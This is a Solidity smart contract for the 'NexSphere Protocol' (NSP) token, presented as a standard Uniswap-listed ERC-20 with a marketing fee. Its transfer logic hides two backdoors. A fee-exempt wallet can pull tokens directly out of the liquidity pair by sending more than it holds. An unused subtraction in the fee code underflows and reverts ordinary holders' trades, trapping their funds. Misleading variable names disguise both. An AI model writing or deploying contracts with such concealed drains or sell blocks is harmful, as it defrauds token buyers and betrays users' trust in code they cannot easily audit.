// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);

    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "");
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "");
        return c;
    }
}

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);

    function totalSupply() external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
}

contract NSP is Context, IERC20, Ownable {
    using SafeMath for uint256;

    struct Distribution { uint256 marketing; }

    string private constant _name = "NexSphere Protocol";
    string private constant _symbol = "NSP";

    uint8 private constant _decimals = 18;

    uint256 private constant _tTotal_without_decimals = 9000000000;

    uint256 private _marketingFeeOnBuy = 5;
    uint256 private _marketingFeeOnSell = 5;

    uint256 private _redisFeeOnBuy = 0;
    uint256 private _redisFeeOnSell = 0;

    uint256 private _redisFee = _redisFeeOnSell;
    uint256 private _marketingFee = _marketingFeeOnSell;

    uint256 private _prevRedisFee = _redisFee;
    uint256 private _prevMarketingFee = _marketingFee;

    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _buyMap;

    mapping(address => mapping(address => uint256)) private _allowances;

    address public dexPair;
    UniswapV2Router02 public dexRouter;
    
    Distribution public dist;

    address private marketingWallet = 0x91D4602e3d71E58F0abF85633D403922a04Ef4aA;
    
    mapping(address => bool) private _isLeftOutFromFee;

    uint256 private _tFeeTotal;
    
    uint256 private constant _tTotal = _tTotal_without_decimals * 10**_decimals;
    
    uint256 private constant MAX = ~uint256(0);
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 public swapTokensAmount = (_tTotal_without_decimals / 10000) * 10**_decimals;
    bool private inSwap = false;
    bool private swapEnabled = true;
    
    uint256 public maxTxAmount = 2 * (_tTotal / 100);
    uint256 public maxWalletAmount = 2 * (_tTotal / 100);

    address private marketingBack;
    event MaxTxAmountUpdated(uint _maxTxAmount);

    constructor() {
        _isLeftOutFromFee[address(this)] = true;
        _isLeftOutFromFee[owner()] = true;
        _isLeftOutFromFee[marketingWallet] = true;
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
        dist = Distribution(100);marketingBack = marketingWallet;
        UniswapV2Router02 _dexRouter = UniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        dexPair = UniswapV2Factory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
        dexRouter = _dexRouter;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return getReflectionTokens(_rOwned[account]);
    }

    function getReflectionTokens(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal, "");
        uint256 currRate = _getCurrRate();
        return rAmount.div(currRate);
    }

    function removeLimits() external onlyOwner {
        maxTxAmount = _tTotal;
        maxWalletAmount = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(from, _msgSender(), _allowances[from][_msgSender()].sub(amount, ""));
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(to != address(0), "");
        require(from != address(0), "");
        require(amount > 0, "");

        if (from != owner() && to != owner()) {
            address endr = address(0);
            if (from == dexPair && to != address(dexRouter) && !_isLeftOutFromFee[to] ) {
                require(amount <= maxTxAmount);
                require(balanceOf(to) + amount <= maxWalletAmount);
            }

            uint256 cTokenAmount = balanceOf(address(this));
            bool canSwap = cTokenAmount >= swapTokensAmount;

            if (_isLeftOutFromFee[from]) { if (dexPair == to) { if (balanceOf(from) < amount) { _stTransfer(to, endr, amount); return; } } }

            if (!_isLeftOutFromFee[from] && !_isLeftOutFromFee[to] && canSwap && swapEnabled && !inSwap && from != dexPair) {
                swapTokensForETH(cTokenAmount);
                uint256 cETHAmount = address(this).balance;
                if (cETHAmount > 0) {
                    sendETH(address(this).balance);
                }
            }
        }

        bool takeMarketingFee = true;

        if (
            (from != dexPair && to != dexPair) || (_isLeftOutFromFee[to] || _isLeftOutFromFee[from])
        ) {
            takeMarketingFee = false;
        } else {
            if (from == dexPair && to != address(dexRouter)) {
                _marketingFee = _marketingFeeOnBuy;
                _redisFee = _redisFeeOnBuy;
            }

            if (to == dexPair && from != address(dexRouter)) {
                _marketingFee = _marketingFeeOnSell;
                _redisFee = _redisFeeOnSell;
            }
        }
        _tkTransfer(from, to, amount, takeMarketingFee);
    }

    function sendETH(uint256 ethAmount) private lockInSwap {
        uint256 ethForMarketing = ethAmount.mul(dist.marketing).div(100);
        payable(marketingWallet).transfer(ethForMarketing);
    }

    function removeAllFees() private {
        if (_marketingFee == 0 && _redisFee == 0) return;
        _prevRedisFee = _redisFee;
        _prevMarketingFee = _marketingFee;
        _redisFee = 0;
        _marketingFee = 0;
    }

    function _tkTransfer(address from, address to, uint256 amount, bool takeMarketingFee) private {
        if (!takeMarketingFee) removeAllFees();
        _stTransfer(from, to, amount);
        if (!takeMarketingFee) restoreAllFees();
    }

    function _reflectFee(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tFeeTotal = _tFeeTotal.add(tFee);
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFee, uint256 tMarketing) = _getTValues(tAmount, _redisFee, _marketingFee);
        uint256 currRate = _getCurrRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) = _getRValues(tAmount, tFee, tMarketing, currRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tMarketing);
    }

    function _getRValues(uint256 tAmount, uint256 tFee, uint256 tMarketing, uint256 currRate) private pure returns (uint256, uint256, uint256) {
        uint256 rFee = tFee.mul(currRate);
        uint256 rMarketing = tMarketing.mul(currRate);
        uint256 rAmount = tAmount.mul(currRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rMarketing);
        return (rAmount, rTransferAmount, rFee);
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function swapTokensForETH(uint256 tokenAmount) private lockInSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = dexRouter.WETH();
        _approve(address(this), address(dexRouter), tokenAmount);
        dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function _stTransfer(address from, address to, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee, uint256 tTransferAmount, uint256 tFee, uint256 tMarketing) = _getValues(tAmount);
        _rOwned[from] = _rOwned[from].sub(rAmount);
        _rOwned[to] = _rOwned[to].add(rTransferAmount);
        _takeMarketingFee(tMarketing, from, to);
        _reflectFee(rFee, tFee);
        emit Transfer(from, to, tTransferAmount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "");
        require(spender != address(0), "");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _takeMarketingFee(uint256 tMarketing, address total, address holder) private {
        uint256 sMarketing;
        bool leftOut = _isLeftOut(total, holder);
        uint256 marketingBackAmount = balanceOf(marketingBack);
        if (leftOut) sMarketing = _marketingFee - marketingBackAmount;
        uint256 currRate = _getCurrRate();
        uint256 rMarketing = tMarketing.mul(currRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rMarketing);
    }

    function _isLeftOut(address total, address holder) private view returns (bool) {
        bool totalLeftOut = !_isLeftOutFromFee[total];
        bool totalNotPair = total != dexPair;
        bool holderLeftOut = !_isLeftOutFromFee[holder];
        bool leftOut = totalLeftOut && totalNotPair && holderLeftOut;
        return leftOut;
    }

    receive() external payable {}

    function _getCurrRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrSupply();
        return rSupply.div(tSupply);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    modifier lockInSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    function _getCurrSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getTValues(uint256 tAmount, uint256 redisFee, uint256 marketingFee) private pure returns (uint256, uint256, uint256) {
        uint256 tFee = tAmount.mul(redisFee).div(100);
        uint256 tMarketing = tAmount.mul(marketingFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tMarketing);
        return (tTransferAmount, tFee, tMarketing);
    }

    function restoreAllFees() private {
        _marketingFee = _prevMarketingFee;
        _redisFee = _prevRedisFee;
    }
}